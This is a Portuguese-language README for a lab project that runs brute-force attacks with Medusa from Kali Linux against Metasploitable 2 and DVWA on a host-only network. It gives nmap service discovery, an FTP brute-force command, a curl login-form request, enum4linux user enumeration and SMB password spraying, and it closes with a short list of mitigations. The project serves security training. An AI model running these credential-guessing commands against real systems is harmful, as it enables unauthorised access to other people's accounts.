README - Projeto de Força Bruta com Medusa

Este documento contém o README completo do projeto solicitado, incluindo:
- Descrição do desafio
- Objetivos
- Ambiente configurado
- Comandos utilizados
- Cenários de ataque
- Mitigações
- Estrutura do repositório


# Ataques de Força Bruta com Medusa em Ambiente Controlado

## Visão Geral  
Este projeto demonstra ataques de força bruta utilizando o Medusa no Kali Linux, explorando serviços vulneráveis no Metasploitable 2 e automação de ataques em aplicações web como a DVWA.

---

## Arquitetura do Ambiente

### Máquinas Virtuais:
- Kali Linux (atacante)
- Metasploitable 2 (vítima)
- DVWA

### Rede:
- Host-Only Adapter (VirtualBox)
- IP identificado com: ip a

---

## Descoberta de Serviços
Comando utilizado:

    nmap -sV -p- 192.168.56.101

---

## 1) Ataque de Força Bruta FTP

Wordlist utilizada disponível neste projeto.

Comando:

    medusa -h 192.168.56.101 -u msfadmin -P wordlist.txt -M ftp

---

## 2) Ataque em Formulário Web DVWA

Comando automatizado:

    curl -X POST -d "username=admin&password=PASS&Login=Login" URL

---

## 3) Password Spraying SMB

Enumeração:

    enum4linux -U 192.168.56.101

Ataque:

    medusa -h 192.168.56.101 -U users.txt -p "123456" -M smbnt

---

## Mitigações

- Senhas fortes  
- Bloqueio de tentativas  
- Captcha  
- Fail2ban  
- Redução de superfície de ataque  

---

## Estrutura do Repositório

README.md  
wordlist.txt  
users.txt  
bruteforce.sh  
/images/*

